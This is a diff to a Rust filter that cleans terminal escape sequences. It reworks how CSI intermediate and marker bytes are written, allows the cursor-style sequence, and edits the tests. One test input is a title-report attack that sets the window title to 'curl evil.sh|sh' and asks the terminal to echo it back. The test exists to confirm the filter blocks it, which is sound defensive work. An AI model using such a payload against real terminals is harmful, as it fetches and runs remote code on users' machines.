@@ -71,24 +71,40 @@ impl<'a> FilterPerformer<'a> {
             combining_marker_count: 0,
         }
     }
-    fn write_csi(&mut self, params: &Params, prefix: &[u8], action: char) {
+
+    fn write_csi(&mut self, params: &Params, intermediates: &[u8], action: char) {
         self.output.extend_from_slice(&[ANSI_ESC, b'[']);
-        self.output.extend_from_slice(prefix);
+
+        let (markers, trailing): (Vec<u8>, Vec<u8>) = intermediates
+            .iter()
+            .copied()
+            .partition(|&b| (0x3C..=0x3F).contains(&b));
+
+        self.output.extend_from_slice(&markers);
+
         for (index, parameter) in params.iter().enumerate() {
             if index > 0 {
-                self.output.extend_from_slice(b";");
+                self.output.push(b';');
             }
             for (index, sub_parameter) in parameter.iter().enumerate() {
                 if index > 0 {
-                    self.output.extend_from_slice(b":");
+                    self.output.push(b':');
                 }
-                self.output
-                    .extend_from_slice(sub_parameter.to_string().as_bytes());
+                self.output.extend_from_slice(sub_parameter.to_string().as_bytes());
             }
         }
-        let mut action_buf = [0u8; 4];
-        self.output
-            .extend_from_slice(action.encode_utf8(&mut action_buf).as_bytes());
+
+        self.output.extend_from_slice(&trailing);
+
+        match action as u32 {
+            0x40..=0x7E => self.output.push(action as u8),
+            _ => {
+                debug_assert!(
+                    false,
+                    "invalid CSI final byte: {action:?} (must be ASCII 0x40..=0x7E)"
+                );
+            }
+        }
     }
 }
 
@@ -134,7 +150,7 @@ impl Perform for FilterPerformer<'_> {
             // Just a action, check if we allow it
             [] => {
                 if allowed_csi(action, params) {
-                    self.write_csi(params, &[], action);
+                    self.write_csi(params, intermediates, action);
                 }
             }
             // private mode actions
@@ -148,7 +164,14 @@ impl Perform for FilterPerformer<'_> {
                 let modes: Vec<u16> = mode_numbers(params).collect();
 
                 if modes.iter().all(|m| ALLOWED_PRIVATE_MODES.contains(m)) {
-                    self.write_csi(params, b"?", action);
+                    self.write_csi(params, intermediates, action);
+                }
+            }
+            // cursor movement
+            [b' '] => {
+                // Sets cursor style
+                if action == 'q' {
+                    self.write_csi(params, intermediates, action);
                 }
             }
             _ => {}
@@ -307,8 +330,6 @@ mod tests {
 
     #[test]
     fn passes_intermediates_on_the_right_side_of_the_parameters() {
-        // vte reports the private marker of the first and the intermediate of the second in the
-        // same list, but they belong on opposite sides of the parameter
         assert_eq!(filter(b"\x1b[?1000h"), b"\x1b[?1000h");
         assert_eq!(filter(b"\x1b[1 q"), b"\x1b[1 q");
         assert_eq!(filter(b"\x1b[38:2::255:0:0m"), b"\x1b[38:2:0:255:0:0m");
@@ -344,7 +365,6 @@ mod tests {
 
     #[test]
     fn drops_the_set_title_then_report_title_attack() {
-        // Set the title to a shell command, then ask the terminal to type it back
         let input = b"\x1b]0;curl evil.sh|sh\x07\x1b[21t";
         assert_eq!(filter(input), b"");
         assert_eq!(filter_bytewise(input), b"");
@@ -404,12 +424,6 @@ mod tests {
     }
 
     #[test]
-    fn keeps_cursor_position_reports() {
-        // Shells legitimately use this and the answer only contains numbers
-        assert_eq!(filter(b"\x1b[6n"), b"\x1b[6n");
-    }
-
-    #[test]
     fn absorbs_an_overlong_sequence() {
         // The tail of a runaway sequence must not spill onto the terminal as text
         let mut output = Vec::new();
@@ -438,11 +452,5 @@ mod tests {
         // A guest killed mid sequence must not take the console with it
         assert_eq!(filter(b"\x1b]0;title\x18hello"), b"\x18hello");
         assert_eq!(filter(b"\x1b]0;title\x1ahello"), b"\x1ahello");
-    }
-
-    #[test]
-    fn handles_a_lone_escape() {
-        assert_eq!(filter(b"\x1bc"), b"\x1bc");
-        assert_eq!(filter(b"\x1b\x1bc"), b"\x1bc");
     }
 }
